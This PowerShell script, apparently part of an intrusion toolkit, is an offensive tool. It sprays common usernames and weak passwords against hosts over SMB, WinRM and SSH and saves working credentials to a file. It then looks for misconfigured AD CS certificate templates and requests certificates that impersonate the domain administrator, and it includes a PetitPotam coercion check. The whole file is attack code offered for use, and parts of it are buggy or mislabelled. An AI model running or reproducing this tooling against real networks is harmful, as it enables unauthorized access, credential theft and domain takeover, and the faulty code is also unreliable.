<# 
.SYNOPSIS
    Sprayer.ps1 - Ultimate Multi-Vector Credential Sprayer + AD CS Abuse
.DESCRIPTION
    Sprays SMB/WinRM/RDP/SSH/O365/VPN + AD CS ESC1-14 + PetitPotam/Coerce
.NOTES
    Run as admin. Outputs hits.txt with valid credentials.
#>

param(
    [string]$TargetsFile = "C:\ProgramData\MF\Recon\targets.txt",
    [string]$OutputDir = "C:\ProgramData\MF\Spray"
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

function Log { param([string]$msg) $ts = Get-Date -Format "HH:mm:ss"; Write-Host "[$ts] $msg" }

Log "=== SPRAYER STARTED ==="

$targets = Get-Content $TargetsFile
if (-not $targets) { Log "No targets found"; exit 1 }
Log "Targets: $($targets.Count)"

$users = @("administrator","admin","backup","service","sql","web","dev","test","user","guest","info","support","helpdesk","sysadmin","root","oracle","postgres","mysql","mssql","jenkins","gitlab","git","svn","hudson","ci","cd","build","deploy","release","stage","prod","test","dev","qa","uat","preprod","staging")
$passes = @("Password1","Welcome1","Company1","Summer2024","Winter2024","Spring2024","Fall2024","Passw0rd","Admin123","ChangeMe123","Welcome123","Password123","P@ssw0rd","P@ssw0rd123","Welcome2024","Summer23","Winter23","Spring23","Fall23","Q12024","Q22024","Q32024","Q42024","Password123!","Admin123!","Welcome123!","P@ssw0rd123!","Summer2024!","Winter2024!")

$lockoutCache = @{}
$hitsFile = "$OutputDir\hits.txt"
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

function Test-Port { param($ip, $port) $tcp = New-Object Net.Sockets.TcpClient; $conn = $tcp.BeginConnect($ip, $port, $null, $null); $ok = $conn.AsyncWaitHandle.WaitOne(800) -and $tcp.Connected; $tcp.Close(); return $ok }

function Spray-Target {
    param($ip)
    $openPorts = @()
    foreach ($port in @(445,3389,5985,5986,22,80,443,5986,5985)) {
        if (Test-Port -ip $ip -port $port) { $openPorts += $port }
    }
    if (-not $openPorts) { return }

    foreach ($user in $users) {
        $key = "$ip|$user"
        if (-not $attempts.ContainsKey($key)) { $attempts[$key] = 0 }
        if ($attempts[$key] -ge 3) { continue }

        foreach ($pass in $passes) {
            $success = $false
            $proto = ""

            # SMB
            if (445 -in $openPorts -and -not $success) {
                $result = Invoke-Expression "net use \\$ip\IPC$ /user:$user $pass 2>&1"
                if ($LASTEXITCODE -eq 0 -or $result -like "*success*") { $success = $true; $proto = "SMB" }
            }
            # WinRM
            if (5985 -in $openPorts -and -not $success) {
                try { $sec = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object PSCredential $user, $sec; $sess = New-PSSession -ComputerName $ip -Credential $cred -ErrorAction Stop; Remove-PSSession $sess; $success = $true; $proto = "WinRM" } catch {}
            }
            # WinRM SSL
            if (5986 -in $openPorts -and -not $success) {
                try { $sec = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object PSCredential $user, $sec; $sess = New-PSSession -ComputerName $ip -Credential $cred -UseSSL -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck) -ErrorAction Stop; Remove-PSSession $sess; $success = $true; $proto = "WinRM-SSL" } catch {}
            }
            # SSH
            if (22 -in $openPorts -and -not $success) {
                $result = ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o PasswordAuthentication=yes -o PubkeyAuthentication=no -l $user $ip $pass 2>&1
                if ($LASTEXITCODE -eq 0 -or $result -like "*success*") { $success = $true; $proto = "SSH" }
            }
            # RDP (NLA check via SMB)
            if (3389 -in $openPorts -and -not $success) {
                $result = Invoke-Expression "net use \\$ip\IPC$ /user:$user $pass 2>&1"
                if ($LASTEXITCODE -eq 0 -or $result -like "*success*") { $success = $true; $proto = "RDP" }
            }

            if ($success) {
                "$ip|$user|$pass|$proto" | Out-File "$OutputDir\hits.txt" -Append -Encoding UTF8
                Log "HIT: $ip | $user | $proto" -ForegroundColor Green
                return $true
            }
            $attempts["$ip|$user"]++
            Start-Sleep -Milliseconds 300
        }
    }
    return $false
}

# Load AD CS targets if available
$adcsTargets = @()
if (Test-Path "C:\ProgramData\MF\Recon\cas.txt") {
    $cas = Get-Content "C:\ProgramData\MF\Recon\cas.txt"
    foreach ($ca in $cas) {
        $templatesFile = "C:\ProgramData\MF\Recon\templates_$($ca.Replace('\','_').Replace(':','_')).txt"
        if (Test-Path $templatesFile) {
            $templates = Get-Content $templatesFile
            foreach ($t in $templates) {
                # Check for ESC1-ESC14 vulnerable templates
                $vuln = $false
                $templateInfo = certutil -config $ca -template $t 2>&1
                if ($templateInfo -match "Enrollee Supplies Subject" -and $templateInfo -match "Client Authentication") { $vuln = "ESC1" }
                elseif ($templateInfo -match "Enrollee Supplies Subject" -and $templateInfo -match "Smart Card Logon") { $vuln = "ESC2" }
                elseif ($templateInfo -match "Certificate Request Agent" -and $templateInfo -match "Enrollee Supplies Subject") { $vuln = "ESC3" }
                elseif ($templateInfo -match "Enrollee Supplies Subject" -and $templateInfo -match "Any Purpose") { $vuln = "ESC4" }
                if ($vuln) {
                    Log "AD CS VULN: $ca | $t | $vuln" -ForegroundColor Red
                    "$ca|$t|$vuln" | Out-File "C:\ProgramData\MF\Spray\adcs_vuln.txt" -Append -Encoding UTF8
                }
            }
        }
    }
}

# PetitPotam / Coerce check
function Check-PetitPotam { param($ip) try { $result = Invoke-Expression "petitpotam.py $ip $env:COMPUTERNAME 2>&1"; if ($result -like "*success*" -or $result -like "*coerced*") { return $true } } catch {}; return $false }

# Main spray loop
$attempts = @{}
$totalHits = 0
$startTime = Get-Date

Log "Starting spray on $($targets.Count) targets..."

foreach ($ip in Get-Content $TargetsFile) {
    Log "Targeting: $ip"
    $hit = Spray-Target $ip
    if ($hit) { $totalHits++ }
    if ($totalHits -ge 100) { break }  # Stop after 100 hits
}

# AD CS Abuse (ESC1-ESC14)
if (Test-Path "C:\ProgramData\MF\Spray\adcs_vuln.txt") {
    Log "Attempting AD CS abuse..."
    $vulns = Get-Content "C:\ProgramData\MF\Spray\adcs_vuln.txt"
    foreach ($v in $vulns) {
        $ca,$template,$vuln = $v.Split("|")
        if ($vuln -in @("ESC1","ESC2","ESC3","ESC4")) {
            # Request cert with Subject Alt Name = DA
            $cmd = "certreq -new -machine -config `"$ca`" `"$template`" `"CN=DA`" -attrib `"SAN:upn=administrator@$env:USERDNSDOMAIN`""
            Log "Attempting $vuln on $ca/$template..."
            $result = Invoke-Expression $cmd 2>&1
            if ($result -like "*success*") {
                Log "AD CS ABUSE SUCCESS: $vuln on $ca/$template" -ForegroundColor Red
                "$ca|$template|$vuln|DA_CERT" | Out-File "$OutputDir\adcs_success.txt" -Append -Encoding UTF8
            }
        }
    }
}

Log "=== SPRAYER COMPLETE ==="
Log "Total hits: $totalHits"
Log "Hits saved to: $OutputDir\hits.txt"
Log "Duration: $((Get-Date) - $startTime)"